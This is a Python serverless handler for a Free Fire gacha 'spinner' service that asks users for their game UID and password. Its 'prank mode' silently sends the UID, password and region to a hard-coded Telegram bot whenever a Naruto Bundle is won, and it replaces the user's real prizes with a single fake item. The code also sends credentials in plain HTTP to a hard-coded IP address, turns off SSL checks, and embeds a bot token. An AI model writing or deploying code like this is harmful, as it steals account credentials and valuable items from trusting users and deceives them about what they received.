#!/usr/bin/env python3
"""
Vercel serverless handler — PRANK MODE (Naruto Bundle only).

Behavior:
  • If the real gacha response contains the Naruto Bundle (710047022):
      – UID / pass / region / Naruto count are silently sent to Telegram.
      – The client receives EXACTLY ONE fake item: {id: 820981015, name: null}.
      – All other real items (rare or not) are hidden from the client.
  • If Naruto Bundle is NOT present:
      – Response is passed through untouched (all rares/unknowns stay honest).
      – Nothing is sent to Telegram.
"""

import os
import sys
import json
import time
import zlib
import base64
import binascii
import re
import asyncio
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import aiohttp

try:
    import output_pb2
except Exception as e:
    output_pb2 = None
    _PB2_IMPORT_ERROR = str(e)
else:
    _PB2_IMPORT_ERROR = None


# ------------------------------------------------------------------ #
#  CONSTANTS
# ------------------------------------------------------------------ #
# --- JWT PROVIDER ---
EXTERNAL_API_URL = "http://148.113.25.200:6293/Tok"

RELEASE_VERSION = "OB55"
DEFAULT_URL     = "https://client.ind.freefiremobile.com"
NARUTO_PAYLOAD  = "D120B9DAAC2C87872B8C115DFD74A832"

# --- PRANK CONFIG ---
FAKE_UNKNOWN_ID = 820981015          # single fake item shown to the client
PRANK_TARGET_ID = 710047022          # ONLY this item triggers the prank (Naruto Bundle)

TG_BOT_TOKEN = os.environ.get(
    "TG_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg"
)
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003684272586")

# Fallback region → host (used only if `addr` is missing from JWT response)
REGION_URL_MAP = {
    "IND": "https://client.ind.freefiremobile.com",
    "IN":  "https://client.ind.freefiremobile.com",
    "TW":  "https://clientbp.ggpolarbear.com",
    "SG":  "https://clientbp.ggpolarbear.com",
    "ID":  "https://clientbp.ggpolarbear.com",
    "TH":  "https://clientbp.ggpolarbear.com",
    "VN":  "https://clientbp.ggpolarbear.com",
    "BR":  "https://clientbp.ggpolarbear.com",
    "US":  "https://clientbp.ggpolarbear.com",
    "ME":  "https://clientbp.ggpolarbear.com",
    "PK":  "https://clientbp.ggpolarbear.com",
    "BD":  "https://clientbp.ggpolarbear.com",
}

RARE_ITEMS_DB = {
    710047022: "Naruto Bundle",
    903047008: "Loot Box - Body Substitution",
    904047008: "Backpack - Ninja's Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan - Emote",
}


# ------------------------------------------------------------------ #
#  JWT HELPERS
# ------------------------------------------------------------------ #
def decode_jwt_payload(token: str):
    """Decode the middle segment of a JWT. Used only as a fallback for
    region detection when `addr` is missing from the JWT provider."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return None


def pick_url_from_token(token: str, fallback: str) -> str:
    payload = decode_jwt_payload(token)
    if not payload:
        return fallback
    region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
    return REGION_URL_MAP.get(region, fallback)


# ------------------------------------------------------------------ #
#  GACHA PARSING
# ------------------------------------------------------------------ #
def _extract_ids_from_bytes(data: bytes):
    items = []
    i = 0
    while i < len(data):
        value = 0
        shift = 0
        while i < len(data):
            b = data[i]
            i += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if 100000000 <= value <= 999999999:
            if not any(x["id"] == value for x in items):
                items.append({"id": value, "name": RARE_ITEMS_DB.get(value)})
    return items


def parse_gacha_response(data: bytes):
    items = []

    try:
        if data.startswith(b"\x1f\x8b"):
            data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    except Exception:
        pass

    if output_pb2 is not None:
        try:
            resp = output_pb2.Garena_420()
            resp.ParseFromString(data)
            for num in re.findall(r"\b(\d{9})\b", str(resp)):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        try:
            for num in re.findall(r"\d{9}", data.decode("utf-8", errors="ignore")):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        items = _extract_ids_from_bytes(data)

    return items


# ------------------------------------------------------------------ #
#  TELEGRAM — silent leak (Naruto Bundle only)
# ------------------------------------------------------------------ #
async def send_to_telegram(session, uid, password, region, naruto_count):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return

    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "🎉 *NARUTO BUNDLE HIT*",
        f"🆔 UID: `{uid}`",
        f"🔑 Pass: `{password}`",
        f"🌍 Region: `{region}`",
        f"🕒 {ts}",
        "",
        f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`",
    ]
    text = "\n".join(lines)
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"

    try:
        async with session.post(
            url,
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            await r.read()
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  TOKEN PROVIDER
# ------------------------------------------------------------------ #
async def get_token_data(session, uid, password, retries=3):
    """
    Call the JWT provider and return the full response dict.

    Endpoint:  GET http://148.113.25.200:6293/Tok?uid=<UID>&pw=<PASS>
    Returns (on success):
        {
          "AccsTok": "...",
          "OpenId":  "...",
          "addr":    "https://client.ind.freefiremobile.com",
          "Tok":     "eyJ...",             # JWT
          "Ver":     "1.132.6",
          "Ob":      "OB55",
          "Uid":     18234768463
        }
    Returns None on failure.
    """
    for attempt in range(retries):
        try:
            async with session.get(
                EXTERNAL_API_URL,
                params={"uid": uid, "pw": password},
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                if res.status != 200:
                    await asyncio.sleep(0.5)
                    continue

                try:
                    data = await res.json(content_type=None)
                except Exception:
                    raw = await res.text()
                    try:
                        data = json.loads(raw)
                    except Exception:
                        await asyncio.sleep(0.5)
                        continue

                # Accept the new response shape (Tok) OR legacy (token)
                tok = data.get("Tok") or data.get("token") or data.get("access_token")
                if isinstance(tok, str) and len(tok) > 50:
                    return data
        except Exception:
            await asyncio.sleep(0.4)
    return None


# ------------------------------------------------------------------ #
#  NETWORK — Gacha request
# ------------------------------------------------------------------ #
async def gacha_req(session, token, payload, url, max_retries=3):
    if not url.endswith("/PurchaseGacha"):
        url = url.rstrip("/") + "/PurchaseGacha"

    headers = {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "X-GA-SV": str(int(time.time())),
        "ReleaseVersion": RELEASE_VERSION,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.12f1",
    }

    last_status = 0
    for _ in range(max_retries):
        try:
            async with session.post(
                url,
                headers=headers,
                data=payload,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.2)
        except Exception:
            last_status = 999
            await asyncio.sleep(0.3)
    return last_status, None


# ------------------------------------------------------------------ #
#  CORE PIPELINE
# ------------------------------------------------------------------ #
async def spin(uid: str, password: str, payload_hex: str = None):
    if output_pb2 is None:
        return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}

    payload_hex = (payload_hex or NARUTO_PAYLOAD).replace(" ", "")
    try:
        payload = binascii.unhexlify(payload_hex)
    except Exception as e:
        return {"success": False, "error": f"invalid_payload_hex: {e}"}

    async with aiohttp.ClientSession() as session:
        # ---- 1) Fetch token from the JWT provider ----
        token_data = await get_token_data(session, uid, password, 3)
        if not token_data:
            return {"success": False, "error": "token_fetch_failed"}

        token = token_data.get("Tok") or token_data.get("token")

        # ---- 2) Determine target URL ----
        url = (token_data.get("addr") or "").strip() or pick_url_from_token(token, DEFAULT_URL)

        jwt_payload = decode_jwt_payload(token) or {}
        region = jwt_payload.get("lock_region", "UNKNOWN")

        # ---- 3) Fire the gacha request ----
        status, resp = await gacha_req(session, token, payload, url, 3)
        if status != 200 or not resp:
            return {
                "success": False,
                "error": f"gacha_http_{status}",
                "region": region,
            }

        items = parse_gacha_response(resp)

        # ----------------------------------------------------------
        #  PRANK LOGIC (Naruto Bundle only)
        #  If ANY Naruto Bundle is present in the real response:
        #    • leak UID/pass/region + Naruto count to Telegram
        #    • return EXACTLY ONE fake item — nothing else
        #  Otherwise: pass the honest item list through untouched.
        # ----------------------------------------------------------
        naruto_hits = [it for it in items if it["id"] == PRANK_TARGET_ID]

        if not naruto_hits:
            return {
                "success": True,
                "uid": uid,
                "region": region,
                "items": items,
            }

        # Naruto Bundle detected → alert Telegram (real info only)
        await send_to_telegram(session, uid, password, region, len(naruto_hits))

        # Return exactly one fake unknown item, regardless of how many
        # real items (Naruto + others) were in the actual gacha response.
        return {
            "success": True,
            "uid": uid,
            "region": region,
            "items": [
                {"id": FAKE_UNKNOWN_ID, "name": None}
            ],
        }


# ------------------------------------------------------------------ #
#  HEALTH CHECK
# ------------------------------------------------------------------ #
HEALTH_START_TS = time.time()
HEALTH_VERSION  = "2.3"


async def _probe_upstream(session, url, timeout=6):
    """Quick reachability probe — returns (ok, latency_ms|None)."""
    t0 = time.time()
    try:
        async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            await r.read()
            latency = int((time.time() - t0) * 1000)
            return (r.status < 500, latency)
    except Exception:
        return (False, None)


async def _probe_jwt_provider(session):
    """Hit the JWT provider with dummy creds. Any JSON response (even an
    error) means the host is alive."""
    t0 = time.time()
    try:
        async with session.get(
            EXTERNAL_API_URL,
            params={"uid": "0", "pw": "0"},
            ssl=False,
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            await r.read()
            latency = int((time.time() - t0) * 1000)
            return (r.status < 500, latency, r.status)
    except Exception:
        return (False, None, None)


async def _run_health_checks(deep: bool):
    checks = {
        "protobuf": {
            "ok": output_pb2 is not None,
            "detail": _PB2_IMPORT_ERROR if output_pb2 is None else "loaded",
        },
        "telegram": {
            "ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
            "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env vars",
        },
    }

    if deep:
        async with aiohttp.ClientSession() as session:
            ok, ms, code = await _probe_jwt_provider(session)
            checks["jwt_provider"] = {
                "ok": ok,
                "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
                "url": EXTERNAL_API_URL,
            }
            ok, ms = await _probe_upstream(session, DEFAULT_URL)
            checks["gacha_host"] = {
                "ok": ok,
                "detail": f"{ms} ms" if ms is not None else "unreachable",
            }

    return checks


def build_health_response(deep: bool = False):
    checks = asyncio.run(_run_health_checks(deep))
    all_ok = all(c["ok"] for c in checks.values())
    return {
        "status": "ok" if all_ok else "degraded",
        "service": "ff-spinner-api",
        "version": HEALTH_VERSION,
        "uptime_sec": int(time.time() - HEALTH_START_TS),
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "checks": checks,
    }


# ------------------------------------------------------------------ #
#  VERCEL HANDLER
# ------------------------------------------------------------------ #
class handler(BaseHTTPRequestHandler):
    def _send_json(self, code: int, obj: dict):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    # ---------- /health ----------
    def _health(self, params):
        deep = params.get("deep", ["0"])[0] in ("1", "true", "yes")
        try:
            payload = build_health_response(deep=deep)
        except Exception as e:
            self._send_json(500, {"status": "error", "error": str(e)})
            return
        code = 200 if payload["status"] == "ok" else 503
        self._send_json(code, payload)

    # ---------- /spin ----------
    def _run(self, params: dict):
        uid = params.get("uid", [None])[0]
        pwd = params.get("pass", [None])[0] or params.get("password", [None])[0]
        payload_hex = params.get("payload", [None])[0]

        if not uid or not pwd:
            self._send_json(400, {"success": False, "error": "missing_params: uid & pass required"})
            return

        try:
            result = asyncio.run(spin(uid, pwd, payload_hex))
        except Exception as e:
            result = {"success": False, "error": f"internal_error: {e}"}

        self._send_json(200 if result.get("success") else 502, result)

    # ---------- HTTP verbs ----------
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        params = parse_qs(parsed.query)

        if path in ("/health", "/api/health"):
            self._health(params)
            return

        self._run(params)

    def do_HEAD(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        if path in ("/health", "/api/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            data = json.loads(body)
            params = {k: [str(v)] for k, v in data.items()}
        except Exception:
            params = {}
        self._run(params)
